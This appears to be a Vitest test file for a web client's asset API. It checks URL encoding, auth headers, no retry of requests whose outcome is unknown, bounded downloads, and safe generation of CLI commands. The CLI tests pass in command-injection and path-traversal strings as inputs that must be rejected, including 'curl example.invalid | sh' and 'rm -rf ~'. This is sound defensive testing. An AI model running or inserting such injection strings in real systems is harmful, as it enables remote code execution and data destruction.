import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { get } from 'svelte/store';
import type { CloudRequest } from '../palimpsestAssets';

vi.mock('$app/navigation', () => ({ goto: vi.fn() }));
const fetchMock = vi.fn();
const identity = { token: 'browser-jwt-original', projectId: 'project-original', userId: 'user-original' };
const digest = `sha256:${'a'.repeat(64)}`;
const revision = `sha256:${'b'.repeat(64)}`;
const body: CloudRequest = { revision, flavor_id: 'flavor-a', network_id: 'network-a', key_name: 'caller-key', server_name: 'training', ssh_username: 'ubuntu' };
const accepted = { consume_id: 31, server_id: null, project_id: identity.projectId, revision, status: 'accepted', ready: false };
const signal = () => new AbortController().signal;

beforeEach(() => {
  vi.resetModules(); localStorage.clear(); sessionStorage.clear(); fetchMock.mockReset();
  vi.stubGlobal('fetch', fetchMock);
});
afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals(); });
async function consumer() {
  // Re-import after resetModules: each case exercises fresh transport/auth subscriptions,
  // rather than retaining a store from the previous browser session.
  const store = await import('$lib/stores/auth');
  store.auth.set({ ...get(store.auth), token: identity.token, userId: identity.userId, projectId: identity.projectId,
    domainId: 'domain-original', sessionId: 'session-original', refreshToken: null, accessExpiresAt: null });
  return { ...await import('../palimpsestAssets'), ...store };
}
function requestUrl(index = 0) { return new URL(fetchMock.mock.calls[index][0], 'https://afterglow.example'); }

describe('named asset API consumer transport', () => {
  it('encodes free-text search and opaque package cursors without query injection or credentials in URLs', async () => {
    const { assetApi } = await consumer();
    fetchMock.mockImplementation(async () => Response.json({ items: [], offset: 20, has_more: false, next_offset: null }));
    await assetApi.hub(identity, signal(), 'torch + cuda&offset=999', 20);
    expect(requestUrl().pathname).toBe('/api/v1/palimpsest/catalog/assets');
    expect([...requestUrl().searchParams]).toEqual([['q', 'torch + cuda&offset=999'], ['limit', '20'], ['offset', '20']]);
    const options = fetchMock.mock.calls[0][1];
    expect(options).toMatchObject({ method: 'GET', credentials: 'include', redirect: 'error', cache: 'no-store' });
    expect(new Headers(options.headers).get('authorization')).toBe(`Bearer ${identity.token}`);
    expect(new Headers(options.headers).get('x-project-id')).toBe(identity.projectId);
    expect(String(fetchMock.mock.calls[0][0])).not.toContain(identity.token);
    await assetApi.packages(identity, signal(), 'torch', 'opaque+/=&cursor-value');
    expect(requestUrl(1).searchParams.get('cursor')).toBe('opaque+/=&cursor-value');
    expect(requestUrl(1).searchParams.get('q')).toBe('torch');
  });

  it('preserves the original native denial instead of falling back to other inventory', async () => {
    const { assetApi } = await consumer();
    fetchMock.mockResolvedValueOnce(Response.json({ error: { message: 'Original actor is denied' } }, { status: 403 }));
    await expect(assetApi.environments(identity, signal(), 'torch')).rejects.toMatchObject({ status: 403, message: 'Original actor is denied' });
    expect(fetchMock).toHaveBeenCalledOnce();
  });


  it('does not automatically replay a consume POST whose network outcome is unknown', async () => {
    const { assetApi } = await consumer();
    fetchMock.mockRejectedValueOnce(new TypeError('Connection lost after transmitting POST'));
    await expect(assetApi.consume(identity, signal(), 'environment-a', body)).rejects.toThrow();
    expect(fetchMock).toHaveBeenCalledOnce();
  });

  it('does not automatically replay a cleanup DELETE with an unknown network outcome', async () => {
    const { assetApi } = await consumer();
    fetchMock.mockRejectedValueOnce(new TypeError('Connection lost after DELETE transmission'));
    await expect(assetApi.cleanup(identity, signal(), accepted.consume_id)).rejects.toThrow();
    expect(fetchMock).toHaveBeenCalledOnce();
  });

  it.each(['projectId', 'userId', 'sessionId'] as const)('rejects a late private JSON body across %s ABA', async (field) => {
    const { assetApi, auth } = await consumer();
    const pending = Promise.withResolvers<unknown>();
    const response = Response.json({});
    vi.spyOn(response, 'json').mockReturnValueOnce(pending.promise);
    fetchMock.mockResolvedValueOnce(response);
    const loading = assetApi.packages(identity, signal(), 'torch');
    const rejected = expect(loading).rejects.toMatchObject({ name: 'AbortError' });
    await vi.waitFor(() => expect(response.json).toHaveBeenCalledOnce());
    const original = get(auth); auth.set({ ...original, [field]: 'different-identity' }); auth.set(original);
    pending.resolve({ project_id: identity.projectId, namespace: 'private', items: [{ name: 'stale-private-result' }], next_cursor: null });
    await rejected;
    expect(fetchMock.mock.calls[0][1].signal.aborted).toBe(true);
  });

  it('retains an in-flight accepted-not-ready consume body through ordinary JWT refresh without replay', async () => {
    const { assetApi, auth } = await consumer();
    const pending = Promise.withResolvers<unknown>();
    const response = Response.json({}, { status: 202 });
    vi.spyOn(response, 'json').mockReturnValueOnce(pending.promise);
    fetchMock.mockResolvedValueOnce(response);
    const creating = assetApi.consume(identity, signal(), 'environment-a', body);
    await vi.waitFor(() => expect(response.json).toHaveBeenCalledOnce());
    auth.update((state) => ({ ...state, token: 'ordinary-rotated-jwt' }));
    pending.resolve(accepted);
    const operation = await creating;
    expect(operation.consume_id).toBe(31);
    expect(operation.ready).toBe(false);
    expect(fetchMock.mock.calls[0][1].signal.aborted).toBe(false);
    expect(fetchMock).toHaveBeenCalledOnce();
  });
});

describe('bounded browser asset downloads', () => {
  it.each(['bundle', 'package'] as const)('returns explicit %s bytes through a bounded reader, never Response.blob', async (kind) => {
    const { assetApi } = await consumer();
    const response = new Response(new Uint8Array([97, 98, 99]), { headers: { 'Content-Length': '3' } });
    const blob = vi.spyOn(response, 'blob'); fetchMock.mockResolvedValueOnce(response);
    const result = kind === 'bundle' ? await assetApi.bundle(identity, signal(), digest)
      : await assetApi.packageDownload(identity, signal(), 'torch+cuda', digest);
    expect(result.size).toBe(3); expect(blob).not.toHaveBeenCalled();
    if (kind === 'bundle') {
      expect(requestUrl().pathname).toBe('/api/v1/palimpsest/hub/bundles');
      expect(JSON.parse(fetchMock.mock.calls[0][1].body)).toEqual({ refs: [digest], include_base_image: true });
    } else {
      expect(requestUrl().pathname).toContain(encodeURIComponent(digest));
      expect(requestUrl().searchParams.get('package')).toBe('torch+cuda');
    }
  });

  it('rejects an advertised oversized body without materializing it', async () => {
    const { assetApi } = await consumer();
    const cancel = vi.fn();
    const response = new Response(new ReadableStream<Uint8Array>({ cancel }), { headers: { 'Content-Length': String(64 * 1024 * 1024 + 1) } });
    const blob = vi.spyOn(response, 'blob'); fetchMock.mockResolvedValueOnce(response);
    await expect(assetApi.bundle(identity, signal(), digest)).rejects.toThrow();
    expect(blob).not.toHaveBeenCalled(); expect(cancel).toHaveBeenCalled();
  });

  it('stops and cancels an unbounded response that omits content length at the browser limit', async () => {
    const { assetApi } = await consumer();
    const chunk = new Uint8Array(1024 * 1024); let pulls = 0;
    const cancel = vi.fn();
    const response = new Response(new ReadableStream<Uint8Array>({
      pull(controller) { pulls++; controller.enqueue(chunk); if (pulls === 70) controller.close(); }, cancel,
    }));
    const blob = vi.spyOn(response, 'blob'); fetchMock.mockResolvedValueOnce(response);
    await expect(assetApi.bundle(identity, signal(), digest)).rejects.toThrow();
    expect(pulls).toBeLessThan(70); expect(cancel).toHaveBeenCalled(); expect(blob).not.toHaveBeenCalled();
  });

  it.each(['projectId', 'userId', 'sessionId'] as const)('cancels an in-flight private download BODY on %s ABA, not just its headers', async (field) => {
    const { assetApi, auth } = await consumer();
    const cancel = vi.fn(), pulled = vi.fn();
    const response = new Response(new ReadableStream<Uint8Array>({
      start(controller) { controller.enqueue(new Uint8Array([97])); },
      pull() { pulled(); }, cancel,
    }));
    const blob = vi.spyOn(response, 'blob'); fetchMock.mockResolvedValueOnce(response);
    const downloading = assetApi.packageDownload(identity, signal(), 'private-training', digest);
    const rejected = expect(downloading).rejects.toMatchObject({ name: 'AbortError' });
    await vi.waitFor(() => expect(response.body?.locked).toBe(true));
    const original = get(auth); auth.set({ ...original, [field]: 'other-value' }); auth.set(original);
    await vi.waitFor(() => expect(cancel).toHaveBeenCalled());
    await rejected;
    expect(fetchMock.mock.calls[0][1].signal.aborted).toBe(true); expect(blob).not.toHaveBeenCalled();
  });

  it('finishes an in-flight private body during ordinary JWT rotation in the same login session', async () => {
    const { assetApi, auth } = await consumer();
    let bodyController!: ReadableStreamDefaultController<Uint8Array>;
    const cancel = vi.fn();
    const response = new Response(new ReadableStream<Uint8Array>({
      start(controller) { bodyController = controller; controller.enqueue(new Uint8Array([97])); }, cancel,
    }));
    fetchMock.mockResolvedValueOnce(response);
    const downloading = assetApi.packageDownload(identity, signal(), 'private-training', digest);
    await vi.waitFor(() => expect(response.body?.locked).toBe(true));
    auth.update((state) => ({ ...state, token: 'ordinary-rotated-jwt' }));
    bodyController.enqueue(new Uint8Array([98, 99])); bodyController.close();
    expect((await downloading).size).toBe(3);
    expect(fetchMock.mock.calls[0][1].signal.aborted).toBe(false);
    expect(cancel).not.toHaveBeenCalled();
  });
});

describe('safe executable local asset guidance', () => {
  it('pulls a Hub bundle by canonical digest with its base before running that digest-bound output directory', async () => {
    const { hubAssetCommands } = await consumer();
    expect(hubAssetCommands(digest).split(/\s*&&\s*/)).toEqual([
      `palimpsest bundle pull ${digest} --include-base --output ./palimpsest-bundle-${digest.slice(7)}`,
      `palimpsest run ./palimpsest-bundle-${digest.slice(7)} --name palimpsest-app`,
    ]);
    expect(() => hubAssetCommands(`${digest}; touch /tmp/pwned`)).toThrow();
  });

  it('quotes the immutable CLI reference and binds both archive and run directory to that exact digest', async () => {
    const { packageAssetCommands } = await consumer();
    const archive = `palimpsest-runtime-${digest.slice(7)}.oci.tar`;
    const directory = `palimpsest-bundle-${digest.slice(7)}`;
    const commands = packageAssetCommands('registry.example:5443', 'project-a', 'ml/torch-cpu', digest, 'runtime-bundle', archive).split(/\s*&&\s*/);
    expect(commands[0]).toBe(`palimpsest pull 'registry.example:5443/project-a/ml/torch-cpu@${digest}' --output ./${archive}`);
    expect(commands[1]).toBe(`palimpsest bundle unpack ./${archive} --output ./${directory}`);
    expect(commands[2]).toBe(`palimpsest run ./${directory} --name palimpsest-app`);
    expect(commands.join('\n')).not.toContain(identity.token);
  });

  it.each([
    { kind: 'runtime-bundle' as const, prefix: 'runtime' },
    { kind: 'oci-image' as const, prefix: 'image' },
  ])('refuses a $kind execution plan whose archive identifies another immutable version', async ({ kind, prefix }) => {
    const { packageAssetCommands } = await consumer();
    const foreignArchive = `palimpsest-${prefix}-${'c'.repeat(64)}.oci.tar`;
    expect(packageAssetCommands('registry.example', 'project-a', 'torch', digest, kind, foreignArchive)).toBe('');
  });

  it.each(['torch; touch /tmp/pwned', "torch'$(touch /tmp/pwned)'", 'a/../b', 'a/./b', 'a//b'])('does not generate a CLI reference from an unsafe package name: %s', async (name) => {
    const { packageAssetCommands } = await consumer();
    expect(packageAssetCommands('registry.example', 'project-a', name, digest, 'runtime-bundle', `palimpsest-runtime-${digest.slice(7)}.oci.tar`)).toBe('');
  });

  it('provides no guessed CLI reference when the trusted registry authority is absent', async () => {
    const { packageAssetCommands } = await consumer();
    expect(packageAssetCommands(null, 'project-a', 'torch', digest, 'runtime-bundle', `palimpsest-runtime-${digest.slice(7)}.oci.tar`)).toBe('');
  });

  it('unpacks runtime bundles through the supported CLI before actually running the extracted directory', async () => {
    const { localAssetCommands } = await consumer();
    const archive = `palimpsest-runtime-${digest.slice(7)}.oci.tar`;
    const directory = `palimpsest-bundle-${digest.slice(7)}`;
    const commands = localAssetCommands('runtime-bundle', archive).split(/\s*&&\s*/);
    expect(commands).toEqual([
      `palimpsest bundle unpack ./${archive} --output ./${directory}`,
      `palimpsest run ./${directory} --name palimpsest-app`,
    ]);
    expect(commands.join('\n')).not.toMatch(/\btar\s+(?:-[^\s]*x|x)/);
    expect(commands.join('\n')).not.toContain(identity.token);
  });

  it('uses actual OCI-root execution for OCI images without inventing a managed-cloud command', async () => {
    const { localAssetCommands } = await consumer();
    expect(localAssetCommands('oci-image', `palimpsest-image-${digest.slice(7)}.oci.tar`)).toBe(`palimpsest run ./palimpsest-image-${digest.slice(7)}.oci.tar --runtime-kind oci-root --name palimpsest-app`);
  });

  it.each(['$(touch /tmp/pwned)', 'torch; curl example.invalid | sh', '../private.oci.tar', 'file\nrm -rf ~'])('rejects API-controlled names as local executable filenames: %s', async (name) => {
    const { localAssetCommands } = await consumer();
    expect(() => localAssetCommands('runtime-bundle', name)).toThrow();
  });
});
